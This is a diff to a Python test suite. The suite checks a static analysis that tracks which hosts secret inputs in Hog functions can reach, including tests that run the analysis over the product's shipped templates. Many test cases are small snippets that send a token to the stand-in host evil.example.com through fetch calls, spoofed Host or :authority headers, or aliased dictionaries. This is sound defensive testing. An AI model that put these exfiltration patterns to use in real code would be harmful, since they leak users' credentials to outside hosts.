@@ -4,6 +4,7 @@ from collections.abc import Callable, Iterator
 from contextlib import AbstractContextManager, contextmanager, nullcontext
 from pathlib import Path
 from typing import Any
+from urllib.parse import urlsplit
 
 from unittest.mock import patch
 
@@ -20,6 +21,8 @@ from products.cdp.backend.secret_origins import (
     secret_origins,
     url_origin,
 )
+from products.cdp.backend.templates import HOG_FUNCTION_TEMPLATES
+from products.cdp.backend.templates.hog_function_template import HogFunctionTemplateDC
 
 # The Node worker's tests read the same table, so the origin stored here and the origin the worker compares agree.
 ORIGIN_CASES = json.loads(
@@ -359,14 +362,14 @@ class TestSecretHosts(SimpleTestCase):
                 "fetch('https://evil.example.com', jsonParse(event.properties.p))",
                 _inputs(secret_headers={"Authorization": "Bearer t"}),
                 {"secret_headers"},
-                {"secret_headers": _origins("https://evil.example.com")},
+                {"secret_headers": UNBOUND},
             ),
             (
                 "computed_option_key",
                 "fetch('https://evil.example.com', {concat('secret_', 'headers_input'): concat('secret_', 'headers')})",
                 _inputs(secret_headers={"Authorization": "Bearer t"}),
                 {"secret_headers"},
-                {"secret_headers": _origins("https://evil.example.com")},
+                {"secret_headers": UNBOUND},
             ),
             (
                 "secret_assigned_into_a_dict_through_an_alias",
@@ -455,14 +458,14 @@ class TestSecretHosts(SimpleTestCase):
                 "fetch('https://evil.example.com', p)",
                 _inputs(secret_headers={"Authorization": "Bearer t"}),
                 {"secret_headers"},
-                {"secret_headers": _origins("https://evil.example.com")},
+                {"secret_headers": UNBOUND},
             ),
             (
                 "by_name_option_with_a_computed_name",
                 "fetch('https://evil.example.com', {'secret_headers_input': concat('secret_', 'headers')})",
                 _inputs(secret_headers={"Authorization": "Bearer t"}),
                 {"secret_headers"},
-                {"secret_headers": _origins("https://evil.example.com")},
+                {"secret_headers": UNBOUND},
             ),
             (
                 "fetch_without_arguments",
@@ -606,6 +609,191 @@ class TestSecretHosts(SimpleTestCase):
                 {"salt": _origins()},
             ),
             (
+                "secret_used_as_a_computed_key",
+                "let d := {}\nd[inputs.token] := 1\nfetch('https://evil.example.com', {'body': jsonStringify(d)})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "secret_used_as_a_nested_computed_key",
+                "let d := {'a': {}}\nd.a[inputs.token] := 1\nprint(d)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_converted_to_text_inside_a_query_shaped_dict",
+                "toString({'__hx_ast': base64Encode(inputs.token)})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_concatenated_inside_a_query_shaped_dict",
+                "let label := f'id { {'__hx_ast': inputs.token} }'",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_concatenated_inside_a_query_shaped_input",
+                "fetch('https://api.example.com', {'body': toString(inputs.shaped)})",
+                _inputs(shaped={"__hx_ast": "{inputs.token}"}, token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_concatenated_through_a_parameter",
+                "fun hashed(value, salt) { return sha256Hex(concat(value, salt)) }\n"
+                "let e := event\ne.distinct_id := hashed(event.distinct_id, inputs.salt)\nreturn e",
+                _inputs(salt="s"),
+                {"salt"},
+                {"salt": _origins()},
+            ),
+            (
+                "query_shaped_dict_concatenated_through_a_parameter",
+                "fun label(value) { return concat('id ', value) }\nlabel({'__hx_ast': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_converted_to_text_for_a_header",
+                "fetch('https://api.example.com', {'headers': {'Authorization': concat('Bearer ', toString(inputs.token))}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://api.example.com")},
+            ),
+            (
+                "digest_of_a_slice_of_a_secret_logged",
+                "print(sha256Hex(substring(inputs.token, 1, 1)))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "digest_of_a_secret_with_text_removed_logged",
+                "let rest := replaceAll(inputs.token, 'ab', '')\nprint(sha256Hex(rest))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "digest_of_a_comparison_with_a_secret_logged",
+                "print(md5Hex(toString(inputs.token < 'm')))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "slice_of_a_secret_sent_to_its_host",
+                "fetch('https://api.example.com', {'headers': {'Authorization': substring(inputs.token, 5)}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://api.example.com")},
+            ),
+            (
+                "url_doubled_until_it_is_very_long",
+                "let a0 := 'https://hooks.example.com/'\n"
+                + "".join(f"let a{n} := concat(a{n - 1}, a{n - 1})\n" for n in range(1, 41))
+                + "fetch(a40, {'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com")},
+            ),
+            (
+                "host_header_names_another_host",
+                "fetch('https://hooks.example.com', {'headers': {'Host': 'evil.example.com', 'Authorization': inputs.token}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "lowercase_host_header_with_a_port",
+                "fetch('https://hooks.example.com', {'headers': {'host': 'evil.example.com:8443', 'Authorization': inputs.token}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com:8443")},
+            ),
+            (
+                "authority_header",
+                "fetch('https://hooks.example.com', {'headers': {':authority': 'evil.example.com'}, 'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "host_header_from_an_input",
+                "fetch('https://hooks.example.com', {'headers': {'Host': inputs.target}, 'body': inputs.token})",
+                _inputs(token="t", target="evil.example.com"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "headers_from_event_data",
+                "fetch('https://hooks.example.com', {'headers': event.properties.headers, 'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "host_header_assigned_into_a_dict",
+                "let h := {}\nh['Host'] := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "header_assigned_with_a_computed_name",
+                "let h := {}\nh[event.properties.name] := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "host_header_assigned_through_an_alias",
+                "let h := {}\nlet a := h\na.Host := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "host_header_assigned_into_options",
+                "let p := {'headers': {}, 'body': inputs.token}\np.headers.Host := 'evil.example.com'\nfetch('https://hooks.example.com', p)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "host_header_in_a_dictionary_input",
+                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
+                _inputs(token="t", headers={"Host": "evil.example.com"}),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "host_header_in_returned_options",
+                "fun options() { return {'headers': {'Host': 'evil.example.com'}, 'body': inputs.token} }\nfetch('https://hooks.example.com', options())",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "headers_without_a_host",
+                "let p := {'headers': inputs.headers, 'body': inputs.token}\np.headers.Authorization := 'x'\nfetch('https://hooks.example.com', p)",
+                _inputs(token="t", headers={"Content-Type": "application/json"}),
+                {"token"},
+                {"token": _origins("https://hooks.example.com")},
+            ),
+            (
+                "host_header_in_secret_headers_named_by_options",
+                "fetch('https://hooks.example.com', {'secret_headers_input': 'secret_headers'})",
+                _inputs(secret_headers={"Host": "evil.example.com", "Authorization": "Bearer t"}),
+                {"secret_headers"},
+                {"secret_headers": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
                 "secret_logged_through_a_lambda",
                 "let same := (v) -> v\nprint(same(inputs.salt))",
                 _inputs(salt="s"),
@@ -684,6 +872,84 @@ class TestSecretHosts(SimpleTestCase):
     def test_origin_of_a_literal_url(self, url: str, expected: SecretOrigins) -> None:
         assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": expected}
 
+    @parameterized.expand(
+        [
+            ("port", "https://hooks.example.com:" + "1" * 5000 + "/a"),
+            ("host", "https://1.2.3." + "4" * 5000 + "/a"),
+        ]
+    )
+    def test_origin_with_an_oversized_number(self, _name: str, url: str) -> None:
+        assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": UNBOUND}
+
     @parameterized.expand([(case["url"], case["origin"]) for case in ORIGIN_CASES])
     def test_url_origin_matches_the_worker(self, url: str, origin: str | None) -> None:
         assert url_origin(url, complete=True) == origin
+
+
+_ENTERED_VALUE = "acme"
+_ENTERED_VALUES_BY_TYPE: dict[str, Any] = {
+    "dictionary": {},
+    "json": {},
+    "boolean": False,
+    "integration": 1,
+    "integration_field": 1,
+}
+# Saving a config change to one of these asks for the secret again, because the analysis cannot bind it.
+_TEMPLATES_WITH_UNBOUND_SECRETS = {
+    "template-airtable": "Debug logging prints the request, which carries the access token.",
+    "template-rudderstack": "The host passes through `replaceAll`, whose result the analysis does not follow.",
+}
+_TEMPLATES_WITH_SECRETS = [
+    template
+    for template in HOG_FUNCTION_TEMPLATES
+    if template.code_language == "hog" and any(schema.get("secret") for schema in template.inputs_schema)
+]
+
+
+def _configured_value(schema: dict[str, Any]) -> Any:
+    if schema.get("default") not in (None, ""):
+        return schema["default"]
+    if schema.get("choices"):
+        return schema["choices"][0]["value"]
+    return _ENTERED_VALUES_BY_TYPE.get(schema.get("type", ""), _ENTERED_VALUE)
+
+
+def _configured_inputs(schemas: list[dict[str, Any]]) -> dict[str, dict[str, Any]]:
+    return {
+        schema["key"]: {"value": _configured_value(schema), "templating": schema.get("templating")}
+        for schema in schemas
+    }
+
+
+class TestShippedTemplateSecrets(SimpleTestCase):
+    @parameterized.expand([(template.id, template) for template in _TEMPLATES_WITH_SECRETS])
+    def test_each_secret_binds_to_hosts_the_template_names(
+        self, template_id: str, template: HogFunctionTemplateDC
+    ) -> None:
+        schemas = [
+            template.inputs_schema,
+            *(mapping.inputs_schema or [] for mapping in template.mapping_templates or []),
+        ]
+        origins = secret_origins(
+            template.code,
+            _configured_inputs(schemas[0]),
+            [_configured_inputs(mapping_schemas) for mapping_schemas in schemas[1:]],
+            {schema["key"] for schema in template.inputs_schema if schema.get("secret")},
+        )
+
+        if template_id in _TEMPLATES_WITH_UNBOUND_SECRETS:
+            assert UNBOUND in origins.values(), "The analysis binds this template now, so drop it from the exceptions."
+            return
+        named = template.code + json.dumps(schemas)
+        unnamed = {
+            key: sorted(
+                host
+                for origin in bound
+                for host in [urlsplit(origin).hostname or ""]
+                if any(label != _ENTERED_VALUE and label not in named for label in host.split("."))
+            )
+            if isinstance(bound, frozenset)
+            else bound
+            for key, bound in origins.items()
+        }
+        assert unnamed == dict.fromkeys(origins, [])
